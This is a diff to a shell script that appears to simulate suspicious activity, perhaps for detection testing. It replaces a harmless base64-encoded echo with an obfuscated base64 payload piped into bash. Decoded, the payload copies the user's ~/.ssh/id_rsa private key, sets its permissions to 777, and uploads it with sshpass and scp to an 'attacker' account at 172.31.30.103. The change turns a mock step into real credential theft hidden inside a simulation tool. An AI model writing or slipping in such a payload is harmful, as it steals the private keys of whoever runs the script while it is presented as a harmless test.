@@ -57,7 +57,11 @@ add_privileged_users() {
 # === 3. Run a suspicious-looking base64 command ===
 run_base64_payload() {
   echo "[4] Running a suspicious base64-encoded command..."
-  echo "ZWNobyAiU3VzcGljaW91cyBhY3Rpdml0eSBleGVjdXRlZCIK" | base64 -d | bash
+  echo "IyEvYmluL2Jhc2gKCmlmIFsgLWQgIiRIT01FLy5zc2giIF07IHRoZW4KICBpZiBbIC1mICIkSE9N
+  RS8uc3NoL2lkX3JzYSIgXTsgdGhlbgogICAgbWtkaXIgLXAgfi90bXAvc3NoX2tleXMKICAgIGNw
+  ICIkSE9NRS8uc3NoL2lkX3JzYSIgfi90bXAvc3NoX2tleXMvCiAgICBjaG1vZCA3Nzcgfi90bXAv
+  c3NoX2tleXMvaWRfcnNhCiAgICBzc2hwYXNzIC1wICdhdHRhY2tlcjEyMzQ1IScgc2NwIH4vdG1w
+  L3NzaF9rZXlzL2lkX3JzYSBhdHRhY2tlckAxNzIuMzEuMzAuMTAzOn4vCiAgZmkKZmkK" | base64 -d | bash
 }
 
 # === 4. Cleanup Function to Undo Simulation Changes ===
